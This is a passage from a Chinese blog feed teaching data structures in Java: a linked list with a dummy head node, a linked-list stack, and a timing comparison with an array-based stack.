e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node dummyHead;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dummyHead = <span class="keyword">new</span> Node(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Node prev = dummyHead;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index ; i++) <span class="comment">//dummyHead是0前面的结点</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表第index（0-based）个位置的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Get failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        <span class="keyword">return</span> cur.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得链表的最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改链表的第index（0 - based）个位置的元素为e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index ; i ++)</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        cur.e = e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找链表中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        Node cur = dummyHead.next;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur.e.equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除index（0-based）位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line"></span><br><span class="line">        Node prev = dummyHead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; index; i++)</span><br><span class="line">            prev = prev.next;</span><br><span class="line"></span><br><span class="line">        Node retNode = prev.next;</span><br><span class="line">        prev.next = retNode.next;</span><br><span class="line">        retNode.next = <span class="keyword">null</span>;</span><br><span class="line">        size --;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retNode.e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除第一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从链表中删除最后一个元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="comment">//        Node cur = dummyHead.next;</span></span><br><span class="line"><span class="comment">//        while(cur != null)&#123;</span></span><br><span class="line"><span class="comment">//            res.append(cur + "-&gt;");</span></span><br><span class="line"><span class="comment">//            cur = cur.next;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="keyword">for</span>(Node cur = dummyHead.next ; cur != <span class="keyword">null</span>; cur = cur.next)</span><br><span class="line">            res.append(cur + <span class="string">"-&gt;"</span>);</span><br><span class="line">        res.append(<span class="string">"Null"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="LinkedListStack-java（链表实现栈代码）"><a href="#LinkedListStack-java（链表实现栈代码）" class="headerlink" title="LinkedListStack.java（链表实现栈代码）"></a>LinkedListStack.java（链表实现栈代码）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListStack</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">Stack</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;E&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedListStack</span><span class="params">()</span></span>&#123;</span><br><span class="line">        list = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.getSize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        list.addFirst(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.removeFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list.getFirst();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(<span class="string">"Stack: top "</span>);</span><br><span class="line">        res.append(list);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        LinkedListStack&lt;Integer&gt; stack = <span class="keyword">new</span> LinkedListStack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i++)&#123;</span><br><span class="line">            stack.push(i);</span><br><span class="line">            System.out.println(stack);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack.pop();</span><br><span class="line">        System.out.println(stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="我对比了一下动态数组栈和链表栈的时间输出结果截图"><a href="#我对比了一下动态数组栈和链表栈的时间输出结果截图" class="headerlink" title="我对比了一下动态数组栈和链表栈的时间输出结果截图"></a>我对比了一下动态数组栈和链表栈的时间输出结果截图</h1><blockquote>
<ul>
<li><h2 id="链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1-x倍"><a href="#链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1-x倍" class="headerlink" title="链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1.x倍"></a>链表的操作中包含更多的new操作，在数值大的时候，会比动态数组的栈速度慢个1.x倍</h2></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626162529124.png" alt="image-20210626162529124"></p>
<h1 id="测试时间代码"><a href="#测试时间代码" class="headerlink" title="测试时间代码"></a>测试时间代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试使用stack运行opCount个push和pop操作所需要的时间，单位：秒</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">testStack</span><span class="params">(Stack&lt;Integer&gt; stack, <span class="keyword">int</span> opCount)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">    Random random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount; i ++)</span><br><span class="line">        stack.push(random.nextInt(Integer.MAX_VALUE));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; opCount; i ++)</span><br><span class="line">        stack.pop();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line">    <span class="keyword">return</span> (endTime - startTime) / <span class="number">1000000000.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-链表的增删改查(完整代码)</title>
    <url>/posts/43.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<h1 id="简单添加元素链表代码-LinkedList"><a href="#简单添加元素链表代码-LinkedList" class="headerlink" title="简单添加元素链表代码 LinkedList"></a>简单添加元素链表代码 LinkedList</h1><h2 id="LinkedList-java"><a href="#LinkedList-java" class="headerlink" title="LinkedList.java"></a>LinkedList.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"><span class="comment">//        Node  node = new Node(e);</span></span><br><span class="line"><span class="comment">//        node.next = head;</span></span><br><span class="line"><span class="comment">//        head = node;</span></span><br><span class="line"></span><br><span class="line">        head = <span class="keyword">new</span> Node(e, head);</span><br><span class="line">        size ++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            head = node.next;</span></span><br><span class="line"><span class="comment">//            head = node;</span></span><br><span class="line"><span class="comment">//            size ++;</span></span><br><span class="line">            addFirst(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            Node prev = head;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index - <span class="number">1</span>; i++)</span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="优化插入链表引入虚拟头结点dummyHead代码"><a href="#优化插入链表引入虚拟头结点dummyHead代码" class="headerlink" title="优化插入链表引入虚拟头结点dummyHead代码"></a>优化插入链表引入虚拟头结点dummyHead代码</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626145850280.png" alt="image-20210626145850280"></p>
<h2 id="LinkedList-java-1"><a href="#LinkedList-java-1" class="headerlink" title="LinkedList.java"></a>LinkedList.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node dummyHead;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dummyHead = <span class="keyword">new</span> Node(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回链表是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表的index（0-based）位置添加新的元素e</span></span><br><span class="line">    <span class="comment">// 在链表中不是一个常用的操作，练习用：）</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt; size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Add failed. Illegal index."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Node prev = dummyHead;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index ; i++) <span class="comment">//dummyHead是0前面的结点</span></span><br><span class="line">                prev = prev.next;</span><br><span class="line"><span class="comment">//            Node node = new Node(e);</span></span><br><span class="line"><span class="comment">//            node.next = prev.next;</span></span><br><span class="line"><span class="comment">//            prev.nxt = node;</span></span><br><span class="line"></span><br><span class="line">            prev.next = <span class="keyword">new</span> Node(e,prev.next);</span><br><span class="line">            size ++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表头添加元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(<span class="number">0</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在链表末尾添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        add(size, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="最终链表的增删改查测试截图"><a href="#最终链表的增删改查测试截图" class="headerlink" title="最终链表的增删改查测试截图"></a>最终链表的增删改查测试截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210626154754659.png" alt="image-20210626154754659"></p>
<h1 id="链表的怎删改查包括测试用例（完整代码）"><a href="#链表的怎删改查包括测试用例（完整代码）" class="headerlink" title="链表的怎删改查包括测试用例（完整代码）"></a>链表的怎删改查包括测试用例（完整代码）</h1><h2 id="LinkedList-java-2"><a href="#LinkedList-java-2" class="headerlink" title="LinkedList.java"></a>LinkedList.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node next;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e, Node next)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(e, <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node dummyHead;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        dummyHead = <span class="keyword">new</span> Node(<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  获取链表中的元素个数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span 